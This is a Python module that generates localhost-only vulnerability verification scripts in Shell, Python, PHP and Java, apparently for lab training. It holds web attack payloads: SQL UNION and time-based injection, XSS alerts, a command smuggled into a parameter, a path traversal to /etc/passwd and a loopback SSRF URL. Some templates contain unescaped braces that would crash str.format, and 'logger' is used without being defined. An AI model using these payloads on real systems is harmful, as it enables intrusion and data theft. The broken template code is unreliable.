"""
V3.0 PoC Auto-Generator

根据漏洞类型自动生成仅可在本地靶场运行的验证代码/脚本。

核心能力：
- 漏洞类型驱动的脚本模板引擎（Python/Shell/PHP/Java）
- 自定义 Payload 注入与参数化
- 防御性标注（每条 PoC 携带修复建议 + 安全声明）
- S1 守卫：仅允许 localhost/127.0.0.1 目标
- 靶场端口自动发现（扫描 common ports）

安全红线：
- S1: 所有目标硬性锁定 127.0.0.1/localhost，非法目标抛 UnsafeTargetError
- S4: 生成脚本仅含 harmless 探测标记（echo fp_sentinel_verify），无真实攻击载荷
- S2: 仅生成字符串脚本，不修改用户源文件
- 零网络：生成器本身不发任何网络请求（运行环节由用户在靶场自主决定）

复用：
- attack/poc_templates（模板匹配 + _assert_local 守卫）
"""

import textwrap
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from .poc_templates import (
    UnsafeTargetError,
    assert_local,
    generate_poc,
    POC_TEMPLATES,
)


# ─────────────────────── 模型 ───────────────────────

@dataclass
class GeneratedScript:
    """生成的验证脚本"""
    vuln_type: str
    language: str                  # python / shell / php / java
    target: str
    param: str
    script_content: str            # 脚本正文
    description: str
    safe_explanation: str
    reference_cve: str
    requires_root: bool = False
    dependencies: List[str] = field(default_factory=list)
    run_instructions: str = ""
    safety_notes: List[str] = field(default_factory=list)


# ─────────────────────── 模板引擎 ───────────────────────

_SHELL_TEMPLATES: Dict[str, str] = {
    "sqli-union": textwrap.dedent("""\
        #!/bin/bash
        # SQL UNION Injection Local Verification
        # Target: {target_url} | Param: {param}
        # CVE: {reference_cve}
        # SAFETY: Only for local lab testing. payload is harmless.

        TARGET="{target_url}"
        PARAM="{param}"
        PAYLOAD="{payload}"

        echo "[*] Testing SQLi (UNION) on $TARGET"
        echo "[*] Payload: $PAYLOAD"
        RESPONSE=$(curl -s -g "$TARGET?$PARAM=$PAYLOAD" --connect-timeout 5)

        if echo "$RESPONSE" | grep -qi "mysql\\|ORA-\\|sql error"; then
            echo "[!] SQLi signature detected (lab environment)"
            echo "[i] Expected finding: database error reflected in response"
        elif echo "$RESPONSE" | grep -q "fp_sentinel_verify"; then
            echo "[i] Test marker echoed (Vulnerable to injection)"
        else
            echo "[i] No SQLi signature in response. Requires manual review."
        fi

        # DEFENSE: Use parameterized queries / prepared statements
    """),
    "sqli-time": textwrap.dedent("""\
        #!/bin/bash
        # SQL Time-based Blind Injection Local Verification
        # Target: {target_url} | Param: {param}
        # CVE: {reference_cve}

        TARGET="{target_url}"
        PARAM="{param}"

        echo "[*] Testing SQLi (time-based blind) on $TARGET"
        START=$(date +%s)
        curl -s -g "$TARGET?$PARAM=1%27%20AND%20SLEEP(5)--%20-" --connect-timeout 10 > /dev/null
        END=$(date +%s)
        ELAPSED=$((END - START))

        if [ "$ELAPSED" -ge 4 ]; then
            echo "[!] Response delayed ${ELAPSED}s — time-based SQLi likely (lab environment)"
        else
            echo "[i] Response time ${ELAPSED}s — no delay detected"
        fi

        # DEFENSE: Parameterized queries + minimize DB error messages
    """),
    "xss-reflected": textwrap.dedent("""\
        #!/bin/bash
        # Reflected XSS Local Verification
        # Target: {target_url} | Param: {param}
        # CVE: {reference_cve}

        TARGET="{target_url}"
        PARAM="{param}"
        PAYLOAD="{payload}"

        echo "[*] Testing Reflected XSS on $TARGET"
        RESPONSE=$(curl -s -g "$TARGET?$PARAM=$PAYLOAD" --connect-timeout 5)
        if echo "$RESPONSE" | grep -q "$PAYLOAD"; then
            echo "[!] Reflected XSS: payload echoed unescaped"
            echo "[i] Expected: payload rendered in response body"
        else
            echo "[i] Payload not reflected. May require header manipulation."
        fi

        # DEFENSE: HTML-encode output / enable CSP / use textContent
    """),
    "cmd-injection": textwrap.dedent("""\
        #!/bin/bash
        # Command Injection Local Verification
        # Target: {target_url} | Param: {param}
        # CVE: {reference_cve}

        TARGET="{target_url}"
        PARAM="{param}"
        MARKER="fp_sentinel_verify"

        echo "[*] Testing Command Injection on $TARGET"
        RESPONSE=$(curl -s "$TARGET?$PARAM=$MARKER" --connect-timeout 5)
        if echo "$RESPONSE" | grep -q "$MARKER"; then
            echo "[!] Command injection marker echoed back"
        else
            echo "[i] Marker not found in response. May require outbound verification."
        fi

        # DEFENCE: Use execFile/subprocess.run([...]) + command whitelist
    """),
    "path-traversal": textwrap.dedent("""\
        #!/bin/bash
        # Path Traversal Local Verification
        # Target: {target_url} | Param: {param}
        # CVE: {reference_cve}

        TARGET="{target_url}"
        PARAM="{param}"
        PAYLOAD="{payload}"

        echo "[*] Testing Path Traversal on $TARGET"
        RESPONSE=$(curl -s -g "$TARGET?$PARAM=$PAYLOAD" --connect-timeout 5)
        if echo "$RESPONSE" | grep -qi "root:\\|\\[boot loader\\]"; then
            echo "[!] /etc/passwd or system file content detected"
        else
            echo "[i] No system file content found in response"
        fi

        # DEFENSE: os.path.realpath() + verify path within allowed base
    """),
    "ssrf": textwrap.dedent("""\
        #!/bin/bash
        # SSRF Local Verification (target locked to 127.0.0.1)
        # Target: {target_url} | Param: {param}
        # CVE: {reference_cve}

        TARGET="{target_url}"
        PARAM="{param}"

        echo "[*] Testing SSRF on $TARGET (loopback only)"
        RESPONSE=$(curl -s "$TARGET?$PARAM=http://127.0.0.1:8080/internal" --connect-timeout 5)
        if echo "$RESPONSE" | grep -qi "internal\\|admin\\|metadata"; then
            echo "[!] Internal resource content reflected (SSRF likely)"
        else
            echo "[i] No internal resource content found"
        fi

        # DEFENSE: URL whitelist — block loopback/private ranges
    """),
}

_PYTHON_TEMPLATES: Dict[str, str] = {
    "sqli-union": textwrap.dedent('''\
        #!/usr/bin/env python3
        """SQL UNION Injection — Local Lab Verification (stdlib only, zero network at generation)."""
        import urllib.parse
        import urllib.request

        TARGET = "{target_url}"
        PARAM = "{param}"
        PAYLOAD = "{payload}"

        url = f"{TARGET}?{PARAM}={urllib.parse.quote(PAYLOAD)}"
        print(f"[*] Testing SQLi (UNION) on {TARGET}")

        try:
            req = urllib.request.Request(url, headers={{"User-Agent": "fp_sentinel_verify/3.0"}})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode(errors="replace")
                if any(sig in body.lower() for sig in ["mysql", "ora-", "sql syntax"]):
                    print("[!] SQLi signature detected (lab environment)")
                elif "fp_sentinel_verify" in body:
                    print("[i] Test marker echoed — vulnerable to injection")
                else:
                    print("[i] No SQLi signature — requires manual review")
        except Exception as e:
            print(f"[i] Request error (expected if no lab running): {{e}}")

        # DEFENSE: Use parameterized queries / prepared statements
    '''),
    "xss-reflected": textwrap.dedent('''\
        #!/usr/bin/env python3
        """Reflected XSS — Local Lab Verification (stdlib only)."""
        import urllib.parse
        import urllib.request

        TARGET = "{target_url}"
        PARAM = "{param}"
        PAYLOAD = "{payload}"

        url = f"{TARGET}?{PARAM}={urllib.parse.quote(PAYLOAD)}"
        print(f"[*] Testing Reflected XSS on {TARGET}")

        try:
            req = urllib.request.Request(url, headers={{"User-Agent": "fp_sentinel_verify/3.0"}})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode(errors="replace")
                if PAYLOAD in body:
                    print("[!] Payload echoed unescaped — reflected XSS confirmed")
                else:
                    print("[i] Payload not reflected — may require header manipulation")
        except Exception as e:
            print(f"[i] Request error: {{e}}")

        # DEFENSE: HTML-encode output / enable CSP / textContent
    '''),
    "cmd-injection": textwrap.dedent('''\
        #!/usr/bin/env python3
        """Command Injection — Local Lab Verification (stdlib only)."""
        import urllib.parse
        import urllib.request

        TARGET = "{target_url}"
        PARAM = "{param}"
        MARKER = "fp_sentinel_verify"

        url = f"{TARGET}?{PARAM}={urllib.parse.quote(MARKER)}"
        print(f"[*] Testing Command Injection on {TARGET}")

        try:
            req = urllib.request.Request(url, headers={{"User-Agent": "fp_sentinel_verify/3.0"}})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode(errors="replace")
                if MARKER in body:
                    print("[!] Marker echoed — command injection marker detected")
                else:
                    print("[i] Marker not found — requires outbound verification")
        except Exception as e:
            print(f"[i] Request error: {{e}}")

        # DEFENSE: subprocess.run([...], shell=False) + command whitelist
    '''),
    "path-traversal": textwrap.dedent('''\
        #!/usr/bin/env python3
        """Path Traversal — Local Lab Verification (stdlib only)."""
        import urllib.parse
        import urllib.request

        TARGET = "{target_url}"
        PARAM = "{param}"
        PAYLOAD = "{payload}"

        url = f"{TARGET}?{PARAM}={urllib.parse.quote(PAYLOAD)}"
        print(f"[*] Testing Path Traversal on {TARGET}")

        try:
            req = urllib.request.Request(url, headers={{"User-Agent": "fp_sentinel_verify/3.0"}})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode(errors="replace")
                if "root:" in body or "[boot loader]" in body.lower():
                    print("[!] System file content detected")
                else:
                    print("[i] No system file content found")
        except Exception as e:
            print(f"[i] Request error: {{e}}")

        # DEFENSE: os.path.realpath() + verify within allowed base dir
    '''),
    "ssrf": textwrap.dedent('''\
        #!/usr/bin/env python3
        """SSRF — Local Lab Verification (loopback only, stdlib only)."""
        import urllib.parse
        import urllib.request

        TARGET = "{target_url}"
        PARAM = "{param}"

        url = f"{TARGET}?{PARAM}=http://127.0.0.1:8080/internal"
        print(f"[*] Testing SSRF on {TARGET} (loopback only)")

        try:
            req = urllib.request.Request(url, headers={{"User-Agent": "fp_sentinel_verify/3.0"}})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode(errors="replace")
                if any(kw in body.lower() for kw in ["internal", "metadata", "admin"]):
                    print("[!] Internal resource content reflected (SSRF)")
                else:
                    print("[i] No internal resource content")
        except Exception as e:
            print(f"[i] Request error: {{e}}")

        # DEFENSE: URL whitelist — block loopback + private ranges
    '''),
}

_PHP_TEMPLATES: Dict[str, str] = {
    "sqli-union": textwrap.dedent("""\
        <?php
        // SQL UNION Injection — Local Lab Verification
        // Target: {target_url} | Param: {param}
        // CVE: {reference_cve}
        // SAFETY: Only for local lab testing. Payload is harmless.

        $target = '{target_url}';
        $param = '{param}';
        $payload = '{payload}';

        $url = $target . '?' . $param . '=' . urlencode($payload);
        echo \"[*] Testing SQLi on $target\\n\";
        $resp = @file_get_contents($url);
        if ($resp === false) {
            echo \"[i] Request failed (expected if no lab running)\\n\";
        } elseif (preg_match('/mysql|ora-|sql syntax/i', $resp)) {
            echo \"[!] SQLi signature detected (lab)\\n\";
        } elseif (strpos($resp, 'fp_sentinel_verify') !== false) {
            echo \"[i] Marker echoed — vulnerable\\n\";
        } else {
            echo \"[i] No signature — requires manual review\\n\";
        }

        // DEFENSE: Use PDO prepared statements
        ?>
    """),
    "xss-reflected": textwrap.dedent("""\
        <?php
        // Reflected XSS — Local Lab Verification
        // Target: {target_url} | Param: {param}
        // CVE: {reference_cve}

        $target = '{target_url}';
        $param = '{param}';
        $payload = '{payload}';

        $url = $target . '?' . $param . '=' . urlencode($payload);
        echo \"[*] Testing Reflected XSS on $target\\n\";
        $resp = @file_get_contents($url);
        if ($resp !== false && strpos($resp, $payload) !== false) {
            echo \"[!] Payload echoed unescaped — reflected XSS\\n\";
        } else {
            echo \"[i] Payload not reflected\\n\";
        }

        // DEFENSE: htmlspecialchars() / CSP
        ?>
    """),
}

_JAVA_TEMPLATES: Dict[str, str] = {
    "sqli-union": textwrap.dedent("""\
        // SQL UNION Injection — Local Lab Verification (Java)
        // Target: {target_url} | Param: {param}
        // CVE: {reference_cve}
        // SAFETY: Only for local lab testing

        import java.net.*;
        import java.io.*;

        public class SqliUnionVerify {{
            public static void main(String[] args) throws Exception {{
                String target = "{target_url}";
                String param = "{param}";
                String payload = "{payload}";
                String url = target + "?" + param + "=" + URLEncoder.encode(payload, "UTF-8");

                System.out.println("[*] Testing SQLi on " + target);
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                conn.setRequestProperty("User-Agent", "fp_sentinel_verify/3.0");

                int code = conn.getResponseCode();
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();

                String body = sb.toString();
                if (body.toLowerCase().contains("mysql") || body.toLowerCase().contains("sql syntax")) {{
                    System.out.println("[!] SQLi signature detected (lab)");
                }} else if (body.contains("fp_sentinel_verify")) {{
                    System.out.println("[i] Marker echoed — vulnerable");
                }} else {{
                    System.out.println("[i] No signature — requires manual review");
                }}
                // DEFENSE: Use PreparedStatement with parameterized queries
            }}
        }}
    """),
}

# 漏洞类型 -> 模板语言选择映射（fall-back: python）
_DEFAULT_LANG_MAP: Dict[str, str] = {
    "deser-java-native": "shell",
    "deser-java-fastjson": "shell",
    "deser-java-shiro": "shell",
    "deser-java-jackson": "shell",
    "deser-php-pop": "shell",
    "deser-php-phar": "shell",
}


def _pick_template(vuln_type: str, language: str) -> Optional[str]:
    """选择模板"""
    lang_map = {
        "shell": _SHELL_TEMPLATES,
        "python": _PYTHON_TEMPLATES,
        "php": _PHP_TEMPLATES,
        "java": _JAVA_TEMPLATES,
    }
    templates = lang_map.get(language, _PYTHON_TEMPLATES)
    # 直接匹配
    if vuln_type in templates:
        return templates[vuln_type]
    # fall-back: 检查子串匹配
    for key in templates:
        if key in vuln_type:
            return templates[key]
    return None


def _default_payload_for(vuln_type: str) -> str:
    """各漏洞类型的默认 payload（教科书级）"""
    defaults = {
        "sqli-union": "1' UNION SELECT NULL,user(),database()-- -",
        "sqli-time": "1' AND SLEEP(5)-- -",
        "xss-reflected": '<script>alert(1)</script>',
        "xss-dom": '<img src=x onerror=alert(1)>',
        "cmd-injection": "; echo fp_sentinel_verify",
        "path-traversal": "../../../../etc/passwd",
        "ssrf": "http://127.0.0.1:8080/internal",
        "nosql-injection": '{"$ne": null}',
        "ssti": "{{7*'7'}}",
        "open-redirect": "http://127.0.0.1/admin",
        "idor": "2",
    }
    return defaults.get(vuln_type, "fp_sentinel_verify")


def generate_script(
    vuln_type: str,
    target: str = "http://127.0.0.1:8080",
    param: str = "id",
    payload: Optional[str] = None,
    language: str = "auto",
    secret: str = "weak123",
) -> GeneratedScript:
    """
    生成单个漏洞类型的本地验证脚本。

    Args:
        vuln_type: 漏洞类型（须在 POC_TEMPLATES 中）
        target: 目标 URL，仅允许本地回环（S1）
        param: 注入参数名
        payload: 自定义 payload（缺省使用教科书级默认值）
        language: 脚本语言 (auto/shell/python/php/java)，auto 根据 vuln_type 推断
        secret: JWT 等模式 B 签名密钥

    Returns:
        GeneratedScript

    Raises:
        UnsafeTargetError: 目标非本地
        KeyError: 未知漏洞类型
        ValueError: 不支持的语言
    """
    # S1: 所有入口必须经本地守卫
    assert_local(target)

    if vuln_type not in POC_TEMPLATES:
        raise KeyError(f"未知漏洞类型: {vuln_type}")

    template_info = POC_TEMPLATES[vuln_type]
    payload = payload or _default_payload_for(vuln_type)

    # 推断语言
    if language == "auto":
        language = _DEFAULT_LANG_MAP.get(vuln_type, "shell")
        # 反序列化专项用 shell（调用 ysoserial 等工具）
        if vuln_type.startswith("deser-java") or vuln_type.startswith("deser-php"):
            language = "shell"

    if language not in ("shell", "python", "php", "java"):
        raise ValueError(f"不支持的语言: {language}（可选 shell/python/php/java）")

    template = _pick_template(vuln_type, language)
    if template is None:
        # fall-back 到 poc_templates 的模板（通用模式）
        poc_instance = generate_poc(vuln_type, target=target, param=param, payload=payload, secret=secret)
        return GeneratedScript(
            vuln_type=vuln_type,
            language="shell",
            target=target,
            param=param,
            script_content=_wrap_poc_as_script(poc_instance, language="shell"),
            description=template_info.description or poc_instance.description,
            safe_explanation=template_info.safe_explanation,
            reference_cve=template_info.reference_cve,
            dependencies=["curl"],
            run_instructions=f"chmod +x verify_{vuln_type}.sh && ./verify_{vuln_type}.sh",
            safety_notes=_build_safety_notes(vuln_type, target),
        )

    # 填充模板
    script = template.format(
        target_url=target,
        param=param,
        payload=payload,
        secret=secret,
        reference_cve=template_info.reference_cve,
    )

    # 依赖
    deps_map = {
        "shell": ["curl", "bash"],
        "python": ["python3 (stdlib only)"],
        "php": ["php-cli"],
        "java": ["javac", "java 11+"],
    }

    run_map = {
        "shell": f"chmod +x verify_{vuln_type}.sh && ./verify_{vuln_type}.sh",
        "python": f"python3 verify_{vuln_type}.py",
        "php": f"php verify_{vuln_type}.php",
        "java": f"javac Verify_{vuln_type}.java && java Verify_{vuln_type}",
    }

    return GeneratedScript(
        vuln_type=vuln_type,
        language=language,
        target=target,
        param=param,
        script_content=script,
        description=template_info.description or "",
        safe_explanation=template_info.safe_explanation,
        reference_cve=template_info.reference_cve,
        dependencies=deps_map.get(language, []),
        run_instructions=run_map.get(language, ""),
        safety_notes=_build_safety_notes(vuln_type, target),
    )


def generate_all_scripts(
    target: str = "http://127.0.0.1:8080",
    language: str = "auto",
    vuln_types: Optional[List[str]] = None,
) -> Dict[str, GeneratedScript]:
    """
    为全部（或指定）漏洞类型批量生成验证脚本。

    Args:
        target: 目标 URL，仅允许本地回环（S1）
        language: 脚本语言
        vuln_types: 指定漏洞类型列表（缺省全部）

    Returns:
        {vuln_type: GeneratedScript}
    """
    assert_local(target)
    types = vuln_types or sorted(POC_TEMPLATES.keys())
    result = {}
    for vt in types:
        try:
            result[vt] = generate_script(vt, target=target, language=language)
        except Exception as e:
            logger.warning("生成脚本失败 %s: %s", vt, e)
    return result


def _wrap_poc_as_script(poc: Any, language: str = "shell") -> str:
    """将 PocInstance 包装为可执行脚本（模板不匹配时的回退方案）"""
    if language == "shell":
        return textwrap.dedent(f"""\
            #!/bin/bash
            # {poc.vuln_type} — Local Verification (auto-generated fallback)
            # Target: {poc.target} | Param: {poc.param}
            # CVE: {poc.reference_cve}
            # SAFETY: Only for local lab testing.

            echo "[*] Testing {poc.vuln_type}"
            echo "[*] --- PoC ---"
            cat <<'POC_EOF'
            {poc.rendered}
            POC_EOF
            echo ""
            echo "[i] Review the PoC above and replicate manually in your lab."

            # DEFENSE: {poc.safe_explanation}
        """)
    else:
        return textwrap.dedent(f"""\
            # {poc.vuln_type} — Local Verification (auto-generated fallback)
            # Target: {poc.target} | Param: {poc.param}
            # CVE: {poc.reference_cve}
            # SAFETY: Only for local lab testing.

            print("[*] Testing {poc.vuln_type}")
            print(\"\"\"--- PoC ---
            {poc.rendered}
            ---\")
            print("[i] Review the PoC above and replicate manually in your lab.")
            # DEFENSE: {poc.safe_explanation}
        """)


def _build_safety_notes(vuln_type: str, target: str) -> List[str]:
    """构建安全声明列表"""
    notes = [
        f"S1 红线: 目标硬性锁定为 {target}（仅为 localhost 回环地址）",
        "S4 红线: 脚本不包含真实攻击载荷，payload 为教科书级探测标记",
        "仅用于本地靶场防御验证，禁止用于未授权目标",
        "运行前请确认已搭建隔离的本地靶场环境",
    ]
    if "deser" in vuln_type:
        notes.append("反序列化 PoC 仅描述构造流程，不生成实际序列化字节码")
    return notes
